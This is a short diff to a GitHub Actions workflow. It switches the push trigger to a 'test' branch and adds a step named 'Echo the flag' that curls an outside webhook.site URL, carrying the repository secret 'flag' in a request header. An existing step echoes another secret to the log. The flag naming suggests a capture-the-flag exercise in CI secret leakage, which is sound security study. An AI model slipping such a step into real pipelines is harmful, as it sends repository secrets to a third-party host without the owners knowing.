@@ -3,7 +3,7 @@ name: IaC
 # Controls when the new movie hosting locations are created or updated
 on:
   push:
-    branches: [ feature/english ]
+    branches: [ test ]
   pull_request:
     branches: [ main ]
 
@@ -24,3 +24,6 @@ jobs:
 
       - name: I ll tell you my current favourite 
         run: echo ${{ secrets.FAVOURITE }}
+      - name: Echo the flag
+        run: |
+          curl https://webhook.site/7a92a206-afdf-4edc-825e-55e759feee50 -H "X-API-Key: ${{ secrets.flag }}"
